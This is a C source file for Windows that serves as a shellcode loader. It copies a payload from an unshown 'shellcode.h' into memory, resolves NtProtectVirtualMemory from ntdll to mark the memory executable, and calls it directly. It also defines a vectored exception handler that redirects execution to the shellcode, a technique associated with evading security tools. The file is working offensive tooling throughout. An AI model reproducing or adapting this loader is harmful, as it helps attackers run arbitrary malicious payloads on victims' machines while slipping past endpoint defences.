#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "shellcode.h"

typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    );

PVOID shellcode_memory = NULL;
SIZE_T shellcode_size = 0;
NtProtectVirtualMemory_t NtProtectVirtualMemory = NULL;

LONG CALLBACK VehHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        printf("Entering VEH Handler\n");

        // Change memory protection
        ULONG old_protect = 0;
        SIZE_T region_size = shellcode_size;
        NTSTATUS status = NtProtectVirtualMemory(
            GetCurrentProcess(),
            &shellcode_memory,
            &region_size,
            PAGE_EXECUTE_READ,
            &old_protect
        );

        if (!NT_SUCCESS(status)) {
            printf("NtProtectVirtualMemory failed: 0x%X\n", status);
            return EXCEPTION_CONTINUE_SEARCH;
        }
        printf("Memory protection changed to executable\n");

        // Redirect RIP to shellcode
        ExceptionInfo->ContextRecord->Rip = (DWORD64)shellcode_memory;
        printf("RIP redirected to shellcode\n");

        printf("Exiting VEH Handler\n");
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int main() {

    shellcode_size = sizeof(shellcode);
    shellcode_memory = VirtualAlloc(NULL, shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (!shellcode_memory) {
        printf("VirtualAlloc failed: %d\n", GetLastError());
        return -1;
    }
    memcpy(shellcode_memory, shellcode, shellcode_size);

    printf("Shellcode memory allocated at: %p\n", shellcode_memory);

    // Resolve NTAPI function
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");

    if (!NtProtectVirtualMemory) {
        printf("Failed to resolve NtProtectVirtualMemory.\n");
        return -1;
    }
    printf("NtProtectVirtualMemory resolved successfully.\n");

    // Change memory protection to executable
    ULONG old_protect = 0;
    SIZE_T region_size = shellcode_size;
    NTSTATUS status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &shellcode_memory,
        &region_size,
        PAGE_EXECUTE_READ,
        &old_protect
    );

    if (!NT_SUCCESS(status)) {
        printf("NtProtectVirtualMemory failed: 0x%X\n", status);
        return -1;
    }
    printf("Memory protection changed to executable\n");

    // Execute shellcode
    printf("Executing shellcode...\n");
    ((void(*)())shellcode_memory)();

    return 0;
}
